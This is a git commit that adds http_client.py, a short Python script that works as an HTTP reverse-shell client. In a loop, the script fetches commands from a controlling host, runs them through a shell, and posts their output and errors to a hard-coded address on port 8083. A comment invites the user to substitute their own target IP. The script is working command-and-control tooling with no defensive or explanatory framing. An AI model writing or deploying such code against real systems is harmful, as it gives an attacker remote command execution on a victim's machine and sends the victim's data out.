87c0808d874d601ea7d8017a0799cf166e39f446
luffy27 <52876924+vivashu27@users.noreply.github.com>
2021-07-06 22:57:05 +0530

    Create http_client.py

---
+++ http_client.py
@@ -0,0 +1,16 @@
+import subprocess
+import requests
+import time
+
+while True:
+    req=requests.get('http://127.0.0.1')#use your own target ip here
+    command=req.text
+    
+    if 'terminate' in command:
+        break
+    else:
+        cmd=subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        post_resp=requests.post("http://192.168.43.188:8083",data=cmd.stdout.read())
+        post_resp=requests.post('http://192.168.43.188:8083',data=cmd.stderr.read())
+    time.sleep(3)
+    
